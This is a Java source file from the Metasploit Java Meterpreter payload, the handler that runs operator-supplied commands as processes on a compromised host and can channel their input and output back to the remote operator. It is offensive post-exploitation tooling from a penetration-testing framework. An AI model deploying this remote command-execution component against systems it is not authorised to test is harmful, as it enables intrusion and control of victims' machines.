package com.metasploit.meterpreter.stdapi;

import java.io.IOException;
import java.util.StringTokenizer;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.ProcessChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class stdapi_sys_process_execute implements Command {

	private static final int PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1);

	private static int pid = 0;

	public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
		StringBuffer cmdbuf = new StringBuffer();
		String cmd = request.getStringValue(TLVType.TLV_TYPE_PROCESS_PATH);
		String argsString = request.getStringValue(TLVType.TLV_TYPE_PROCESS_ARGUMENTS, "");
		int flags = request.getIntValue(TLVType.TLV_TYPE_PROCESS_FLAGS);

    cmdbuf.append(cmd);
    if (argsString.length() > 0) {
      cmdbuf.append(argsString);
    }


		if (cmd.length() == 0)
			return ERROR_FAILURE;

		Process proc = execute(cmdbuf.toString());

		if ((flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) != 0) {
			ProcessChannel channel = new ProcessChannel(meterpreter, proc);
			synchronized (stdapi_sys_process_execute.class) {
				pid++;
				response.add(TLVType.TLV_TYPE_PID, pid);
				response.add(TLVType.TLV_TYPE_PROCESS_HANDLE, pid);
			}
			response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
		} else {
			proc.getInputStream().close();
			proc.getErrorStream().close();
			proc.getOutputStream().close();
		}
		return ERROR_SUCCESS;
	}

	protected Process execute(String cmdstr) throws IOException {
		Process proc = Runtime.getRuntime().exec(cmdstr);
		return proc;
	}
}
